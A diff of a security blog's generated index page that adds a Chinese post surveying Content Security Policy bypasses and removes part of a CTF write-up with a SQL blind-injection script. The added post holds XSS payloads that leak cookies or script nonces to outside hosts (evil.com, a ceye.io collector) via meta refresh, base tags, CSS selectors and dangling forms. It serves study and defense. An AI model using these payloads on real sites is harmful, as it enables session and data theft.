@@ -71,6 +71,124 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-bypass_csp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/05/19/bypass_csp/" class="article-date">
+  <time class="dt-published" datetime="2020-05-19T16:00:00.000Z" itemprop="datePublished">2020-05-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/05/19/bypass_csp/">bypass_csp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>内容安全策略  (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP">CSP</a>) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a>) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 </p>
+<h2 id="csp语法"><a href="#csp语法" class="headerlink" title="csp语法"></a>csp语法</h2><p>CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。</p>
+<p>CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"><code>default-src</code></a> :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"><code>default-src</code></a> )</p>
+<p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p>
+<p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p>
+<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; </code></p>
+<p>script-src 中 strict-dynamic 中的作用:</p>
+<ul>
+<li>丢弃白名单</li>
+<li>允许执行js生成的js代码，例如：document.createElement(‘script’) </li>
+<li>使  nonce-only CSPs  可以工作</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p>
+<h3 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h3><p><code>https://cdn.com/*</code>只能匹配<code>https://cdn.com/*</code></p>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="csp策略不完全导致的绕过"><a href="#csp策略不完全导致的绕过" class="headerlink" title="csp策略不完全导致的绕过"></a>csp策略不完全导致的绕过</h3><h3 id="利用302跳转"><a href="#利用302跳转" class="headerlink" title="利用302跳转"></a>利用302跳转</h3><p><code> Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p>
+<p>如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 </p>
+<p>假设static目录下存在一个302文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Static/302.php</span><br><span class="line"></span><br><span class="line">&lt;?php Header(&quot;location: &quot;.$_GET[&#x27;url&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过域限制的一些tricks"><a href="#绕过域限制的一些tricks" class="headerlink" title="绕过域限制的一些tricks"></a>绕过域限制的一些tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://lorexxar.cn&quot;</span>&gt;</span> (H5预加载)(only chrome)</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://lorexxar.cn&quot;</span>&gt;</span> （DNS预加载）</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5;http://lorexxar.cn?c=[cookie]&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用可信域的资源绕过"><a href="#利用可信域的资源绕过" class="headerlink" title="利用可信域的资源绕过"></a>利用可信域的资源绕过</h3><p>很多网站都会将google,baidu……添加到可信域里面，而如果里面存在可控的输出我们便可以绕过csp</p>
+<p>常用可控jsonp: <a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
+<h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="利用-lt-base-gt-标签"><a href="#利用-lt-base-gt-标签" class="headerlink" title="利用&lt;base&gt;标签"></a>利用<code>&lt;base&gt;</code>标签</h4><p>Specify a default URL and a default target for all links on a page:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://www.evil.com/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/stickman.gif&quot;</span> <span class="attr">width</span>=<span class="string">&quot;24&quot;</span> <span class="attr">height</span>=<span class="string">&quot;39&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Stickman&quot;</span>&gt;</span><span class="comment">&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tags/tag_base.asp&quot;</span>&gt;</span>HTML base Tag<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="comment">&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以设置个<code>&lt;base&gt;</code>标签，将相对路径导向恶意的网站</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://evil.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://evil.com/foo/bar.js">https://evil.com/foo/bar.js</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(0000);</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p>防御方式：</p>
+<p>在csp中添加：base-uri ‘none’ 或 base-uri ‘self’</p>
+<h4 id="利用chrome-bug-来修改script-src的值"><a href="#利用chrome-bug-来修改script-src的值" class="headerlink" title="利用chrome bug 来修改script src的值"></a>利用chrome bug 来修改script src的值</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">set</span> <span class="attr">href</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">attributeName</span>=<span class="string">&quot;href&quot;</span> <span class="attr">to</span>=<span class="string">&quot;data:,alert(1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">src</span>=<span class="string">&quot;foo.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SVG中的set标签可以修改其他标签的属性值</p>
+<p>该漏洞在chrome58中修复</p>
+<h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">script &#123; <span class="attribute">display</span>: block &#125;</span></span><br><span class="line"><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;a&quot;</span>]</span>:after &#123; content: <span class="built_in">url</span>(<span class="string">&quot;record?a&quot;</span>) &#125;</span></span><br><span class="line"><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;b&quot;</span>]</span>:after &#123; content: <span class="built_in">url</span>(<span class="string">&quot;record?b&quot;</span>) &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以联合其他标签来发出请求，如<code>&lt;a&gt;</code> …</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">script<span class="selector-attr">[nonce^=<span class="string">&quot;0&quot;</span>]</span>~<span class="selector-tag">a</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://y5pwcd.ceye.io/success&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>相关的css 语法</p>
+<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p>
+<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p>
+<h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>破坏原有的结构，将script标签变成文本，诱使用户点击</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XSS --&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//evil.com/form&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;nonce&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- End XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;foo/bar.js&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>利用低版本JQuery等js框架漏洞来绕过csp</p>
+<h2 id="绕过实例"><a href="#绕过实例" class="headerlink" title="绕过实例"></a>绕过实例</h2><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>检查csp: <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a> </p>
+<p>常用可控jsonp: <a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
+<p><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa">csp mitigator</a> :一个csp调试工具</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPs… You won’t guess what happened next!](<a target="_blank" rel="noopener" href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPs… You won’t guess what happened next!.pdf) </p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/423/">前端防御从入门到弃坑–CSP变迁</a></p>
+<h2 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h2><p>Bypassing CSP script nonces via the browser cache： <a target="_blank" rel="noopener" href="http://sebastian-lekies.de/csp/attacker.php">http://sebastian-lekies.de/csp/attacker.php</a></p>
+<p> <a target="_blank" rel="noopener" href="https://hurricane618.me/2018/06/30/csp-bypass-summary/">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p>
+<p> <a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p>
+<p> <a target="_blank" rel="noopener" href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p>
+<p> <a target="_blank" rel="noopener" href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/05/19/bypass_csp/" data-id="cku8ky2xy003adnnf22b08952" data-title="bypass_csp" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-2020年网鼎杯青龙组" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/05/11/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" class="article-date">
@@ -137,7 +255,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/05/11/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" data-id="cku8k8fwe000fd0obafncgfd6" data-title="2020年网鼎杯青龙组" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/05/11/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" data-id="cku8ky2wl000fdnnfh3irgbfw" data-title="2020年网鼎杯青龙组" class="article-share-link">Share</a>
       
       
       
@@ -282,7 +400,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/05/05/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cku8k8fx30025d0obdcrc6xwe" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/05/05/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cku8ky2xg0025dnnfg03s8luv" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
       
       
       
@@ -429,7 +547,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/05/05/de1ctf2020/" data-id="cku8k8fxr0040d0obdjai3bne" data-title="de1ctf2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/05/05/de1ctf2020/" data-id="cku8ky2y80040dnnf5xby7zh5" data-title="de1ctf2020" class="article-share-link">Share</a>
       
       
       
@@ -722,7 +840,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/05/04/4%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cku8k8fwn000yd0ob3cfna4z7" data-title="4月做题" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/05/04/4%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cku8ky2wv000ydnnf3612e6j5" data-title="4月做题" class="article-share-link">Share</a>
       
       
       
@@ -968,7 +1086,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/05/04/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cku8k8fye0053d0oba6bj2rlg" data-title="maven学习笔记" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/05/04/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cku8ky2yu0053dnnfda4xc0gy" data-title="maven学习笔记" class="article-share-link">Share</a>
       
       
       
@@ -1072,7 +1190,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="cku8k8fvy0000d0obdg6hf5oj" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="cku8ky2vu0000dnnf9t578jjs" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
       
       
       
@@ -1176,7 +1294,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="cku8k8fwg000hd0ob0ka9gdec" data-title="2020数字中国创新大赛-虎符网络安全" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="cku8ky2wn000hdnnf2oj13fui" data-title="2020数字中国创新大赛-虎符网络安全" class="article-share-link">Share</a>
       
       
       
@@ -1402,7 +1520,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/byb2019/" data-id="cku8k8fxg0030d0ob41g9bf7w" data-title="百越杯2019" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/byb2019/" data-id="cku8ky2xu0030dnnf8lm73ore" data-title="百越杯2019" class="article-share-link">Share</a>
       
       
       
@@ -1491,90 +1609,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/byb2019%E7%BA%BF%E4%B8%8Bawd/" data-id="cku8k8fxh0034d0ob77518b4a" data-title="百越杯总结" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/04/19/bytectfwp/" class="article-date">
-  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/04/19/bytectfwp/">bytectf wp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="variable">$row</span>[<span class="string">&#x27;userid&#x27;</span>])&#123;</span><br><span class="line">		<span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">		<span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">		<span class="variable">$sql</span>-&gt;query(<span class="string">&quot;update article set title=&#x27;<span class="subst">$title</span>&#x27;,content=&#x27;<span class="subst">$content</span>&#x27; where title=&#x27;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p>
-<p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p>
-<p>sql盲注判断脚本:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">anti_disturb_key=<span class="string">&#x27;cjb_ccreater_s_test&#x27;</span></span><br><span class="line">PHPSESSID=<span class="string">&#x27;404i3uiletdpke9rb0egs7vf47&#x27;</span></span><br><span class="line">check_article_id=<span class="number">20</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">check_title</span>):</span></span><br><span class="line">    url=<span class="string">&#x27;http://112.125.24.134:9999/edit.php?id=&#x27;</span>+<span class="built_in">str</span>(check_article_id)</span><br><span class="line">    res=requests.get(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;)</span><br><span class="line">    bs=BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    title=bs.find(<span class="string">&#x27;input&#x27;</span>,attrs=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;title&quot;</span>&#125;)[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    content=bs.find(<span class="string">&#x27;textarea&#x27;</span>,attrs=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;content&quot;</span>&#125;).text</span><br><span class="line">    <span class="keyword">if</span> title[:<span class="built_in">len</span>(anti_disturb_key)]!=anti_disturb_key :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disturb&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> content!=<span class="string">&#x27;success&#x27;</span>+check_title:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;false&#x27;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span 